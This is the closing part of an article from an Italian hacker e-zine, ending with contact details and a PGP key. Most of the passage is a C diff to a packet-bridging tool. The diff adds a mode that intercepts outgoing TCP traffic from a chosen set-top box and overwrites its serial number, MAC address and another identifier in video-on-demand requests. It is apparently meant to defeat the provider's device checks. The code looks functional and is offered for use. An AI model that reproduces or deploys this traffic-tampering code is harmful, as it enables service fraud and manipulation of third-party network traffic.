-#define PROGNAME "A-team"
+#define CODE1 "000000000000"
+#define CODE2 "00:00:00:00:00:00"
+#define CODE4 "000000000000000"
+
 #define ERRBUF_SIZE ((PCAP_ERRBUF_SIZE > LIBNET_ERRBUF_SIZE) ? PCAP_ERRBUF_SIZE : LIBNET_ERRBUF_SIZE)
 #define READ_TIMEOUT 1000
 #define STACK_TIMEOUT 2
@@ -32,6 +43,15 @@
 #define LOOP -1
 #define debugf(x...); if(debug) { printf(x); fflush(stdout); }
 
+#define RUNPATCH 0
+#define TOK1 "WebDVD=STBsn="
+#define TOK2 "&MAC="
+#define TOK3 "&IP="
+#define TOK4 "&HR="
+#define LEN1 0x0c
+#define LEN2 0x11
+#define LEN4 0x0f
+
 #include <pcap.h>
 #include <libnet.h>
 #include <pthread.h>
@@ -58,7 +78,8 @@
 struct ether_addr *ext_hw_addr = (struct ether_addr *)NULL;
 struct interface internal, external;
 char debug = DEBUG;
-
+char runpatch = RUNPATCH;
+unsigned char *video_hw_addr = (unsigned char *)NULL;
 extern char pcap_version[];
 
 int main(int argc, char *argv[]);
@@ -69,6 +90,7 @@
 void heat(char *id, struct pcap_pkthdr *pcap_h, u_char *out_packet);
 void push(char *packet, int len, int id, struct timeval *tv);
 int pop(char *packet, int len, int id);
+unsigned char *replace(unsigned char *buf, int len);
 
 int main(int argc, char* argv[]) {
         /* Set id flags */
@@ -77,8 +99,7 @@
 
         /* Blank record structures */
         bzero(int_recs, sizeof(struct stack_packet) * STACKLEN);
-        bzero(int_recs, sizeof(struct stack_packet) * STACKLEN);
-
+        bzero(ext_recs, sizeof(struct stack_packet) * STACKLEN);
         /* Get command line params */
         getparms(argc, argv);
 
@@ -86,6 +107,8 @@
         initialize(&internal);
         initialize(&external);
 
+        debugf(" * videos.patch detected.. turned %s\n", ((runpatch) ? "ON" : "OFF"));
+
         /* Fork && go! */
         if(!debug) {
                 /* Go in the daemon land */
@@ -95,7 +118,7 @@
                 setsid();
         }
 
-        debugf("Logging traffic ( . -> from external to internal | o -> from internal to external)\n");
+        debugf("Logging traffic ( . -> from external to internal | o -> from internal to external | * -> videospatched packet)\n");
         pthread_create(&external.pthread, NULL, threadloop, (void *)&external);
         threadloop((void *)&internal);
 
@@ -107,7 +130,7 @@
         char optc;
 
         /* Parse command line params */
-        while((optc = getopt(argc, argv, "i:e:dh")) != EOF) {
+        while((optc = getopt(argc, argv, "i:e:a:dvh")) != EOF) {
                 switch(optc) {
                         case 'i':
                                 internal.name = optarg;
@@ -115,9 +138,20 @@
                         case 'e':
                                 external.name = optarg;
                                 break;
+                        case 'a':
+                                video_hw_addr = (unsigned char *)malloc(ETHER_ADDR_LEN * sizeof(unsigned char));
+                                if(sscanf(optarg, "%x:%x:%x:%x:%x:%x", &video_hw_addr[0], &video_hw_addr[1], &video_hw_addr[2],
+                                                         &video_hw_addr[3], &video_hw_addr[4], &video_hw_addr[5]) == 6) {
+                                        break;
+                                }
+                                usage(argv[0]);
+                                exit(0);
                         case 'd':
                                 debug = 1;
-                                 debugf("Set verbose mode ON\n");
+                                debugf("Set verbose mode ON\n");
+                                break;
+                        case 'v':
+                                runpatch = 1;
                                 break;
                         case 'h':
                                 usage(argv[0]);
@@ -132,6 +166,12 @@
         }
         debugf("Set internal interface to: %s\n", internal.name);
         debugf("Set external interface to: %s\n", external.name);
+        if(video_hw_addr == (unsigned char *)NULL) {
+                debugf("No video hardware address detected, applying to all traffic.\n");
+        } else {
+                debugf("Set video hardware address to: [%02x:%02x:%02x:%02x:%02x:%02x]\n", video_hw_addr[0], video_hw_addr[1],
+                                                        video_hw_addr[2], video_hw_addr[3], video_hw_addr[4], video_hw_addr[5]);
+        }
 
         return;
 }
@@ -139,7 +179,7 @@
 void usage(char *progname)
 {
         /* Program usage */
-        fprintf(stderr, "usage:\t%s -i internal_interface -e external_interface [-d]\n\t%s -h\n\n", progname, progname);
+        fprintf(stderr, "usage:\t%s -i internal_interface -e external_interface [-d] [-v] [-a video_hw_addr]\n\t%s -h\n\n", progname, progname);
         return;
 }
 
@@ -203,13 +243,16 @@
 
 void heat(char *id, struct pcap_pkthdr *pcap_h, u_char *out_packet) {
         struct interface *iface;
-        
+        u_char *payload;
+        u_char packetcp[SNAPLEN];
+        struct libnet_ip_hdr *iphdr;
+        struct libnet_tcp_hdr *tcphdr;
+
         /* Check where the packet is coming from */
         if((int)id) {
                 /* From external interface to internal interface */
                 iface = &internal;
 
-                /* Check for duplicates */
                 pthread_mutex_lock(&ext_packet_mutex);
                 if (pop(out_packet, pcap_h->len, (int)id)){
                         /* packet is duplicate */
@@ -217,8 +260,9 @@
                         return;
                 }
                 push(out_packet, pcap_h->len, (int)id, (struct timeval *)&pcap_h->ts);
-                pthread_mutex_unlock(&ext_packet_mutex);
 
+                /* Check for duplicates */
+                pthread_mutex_unlock(&ext_packet_mutex);
         } else {
                 /* From internal interface to external interface */
                 iface = &external;
@@ -230,10 +274,28 @@
                         pthread_mutex_unlock(&int_packet_mutex);
                         return;
                 }
+
+                if(runpatch) {
+                        if((video_hw_addr == (unsigned char *)NULL) || !memcmp(((struct libnet_ethernet_hdr *)out_packet)->ether_shost, video_hw_addr, ETHER_ADDR_LEN)) {
+                                iphdr = (struct libnet_ip_hdr *)(out_packet + LIBNET_ETH_H);
+                                if(iphdr->ip_p == IPPROTO_TCP) {
+                                        memcpy(packetcp, out_packet, pcap_h->len);
+                                        tcphdr = (struct libnet_tcp_hdr *)((int)packetcp + LIBNET_ETH_H + LIBNET_IP_H);
+                                        payload = packetcp + LIBNET_ETH_H + LIBNET_IP_H + (tcphdr->th_off << 2);
+                                        if(replace(payload, pcap_h->len - LIBNET_ETH_H - LIBNET_IP_H - tcphdr->th_off) != NULL) {
+                                                out_packet = packetcp;
+                                                debugf("*");
+                                                libnet_do_checksum(out_packet + 14, IPPROTO_TCP, pcap_h->len - LIBNET_ETH_H - LIBNET_IP_H);
+                                        }
+                                }
+                        }
+                }
+
                 memcpy(((struct libnet_ethernet_hdr *)out_packet)->ether_shost, ext_hw_addr->ether_addr_octet, ETHER_ADDR_LEN);
+
                 push(out_packet, pcap_h->len, (int)id, (struct timeval *)&pcap_h->ts);
                 pthread_mutex_unlock(&int_packet_mutex);
-        }        
+        }
 
         /* Write the packet */
         libnet_write_link_layer(iface->net_link, iface->name, out_packet, pcap_h->len); 
@@ -292,4 +354,38 @@
         return 0;
 }
 
-/******************************************************************************/
+unsigned char *replace(unsigned char *buf, int len)
+{
+        int i;
+        char status = 0;
+
+        if(len < strlen(TOK1) + LEN1 + strlen(TOK2) + LEN2 + strlen(TOK3) + strlen(TOK4) + LEN4) {
+                return(NULL);
+        }
+
+        for(i = 0; i <= len - strlen(TOK1) + LEN1 + strlen(TOK2) + LEN2 + strlen(TOK3) + strlen(TOK4) + LEN4; i++) {
+                if(memcmp(buf + i, TOK1, strlen(TOK1))) {
+                        continue;
+                }
+                if(memcmp(buf + i + strlen(TOK1) + LEN1, TOK2, strlen(TOK2))) {
+                        continue;
+                }
+                if(memcmp(buf + i + strlen(TOK1) + LEN1 + strlen(TOK2) + LEN2, TOK3, strlen(TOK3))) {
+                        continue;
+                }
+
+                memcpy(buf + i + strlen(TOK1), CODE1, LEN1);
+                memcpy(buf + i + strlen(TOK1) + LEN1 + strlen(TOK2), CODE2, LEN2);
+                status = 1;
+
+                i += strlen(TOK1) + LEN1 + strlen(TOK2) + LEN2 + strlen(TOK3);
+                while(memcmp(buf + i++, TOK4, strlen(TOK4))) {
+                        if(i > len - LEN4) {
+                                return(NULL);
+                        }
+                }
+                memcpy(buf + i + strlen(TOK4) - 1, CODE4, LEN4);
+        }
+
+        return(status ? buf : NULL);
+}
<-X->


(Questo racconto si ispira a fatti realmente accaduti. Le tecniche descritte
in quello che avete appena letto corrispondono a realta`. Ogni nome e luogo
citato e` invece stato inventato e frutto della fantasia dell'autore, ogni
riferimento a fatti, cose, citta`, piccole isole o villaggi segue puramente
la grammatica latina.)

E ancora non e` finita.

--
t.R.



-[ WEB ]----------------------------------------------------------------------

        http://www.bfi.cx
	http://www.s0ftpj.org/bfi/
	http://bfi.itapac.net


-[ E-MAiL ]-------------------------------------------------------------------

	bfi@s0ftpj.org


-[ PGP ]----------------------------------------------------------------------

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i
mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
=o7CG
-----END PGP PUBLIC KEY BLOCK-----


==============================================================================
-----------------------------------[ EOF ]------------------------------------
==============================================================================
